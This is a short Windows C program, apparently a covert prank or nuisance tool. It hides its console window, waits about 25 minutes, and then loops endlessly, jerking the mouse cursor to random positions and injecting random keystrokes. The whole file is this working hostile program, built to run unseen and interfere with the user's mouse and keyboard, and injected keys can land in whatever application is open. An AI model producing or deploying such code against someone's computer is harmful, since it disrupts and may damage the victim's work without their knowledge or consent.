#include <Windows.h>
#include <time.h>
#define getrandom time(NULL)

int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Sleep(1500000);
	while(0 == 0) 
	{
		INPUT input;
		POINT mouse;
		int x, y;
		GetCursorPos(&mouse);
		x = mouse.x;
		y = mouse.y;
		srand(getrandom);
		SetCursorPos(x + rand() % 100 + 1, y + rand() % 100 + 1);
		Sleep(1000);
		SetCursorPos(x + rand() % 100 + 1, y - rand() % 100 + 1);
		Sleep(1000);
		input.type = INPUT_KEYBOARD;
		input.ki.wVk = (rand() % (0x5a - 0x30)) + 0x30;
		SendInput(1, &input, sizeof(INPUT));

	}
}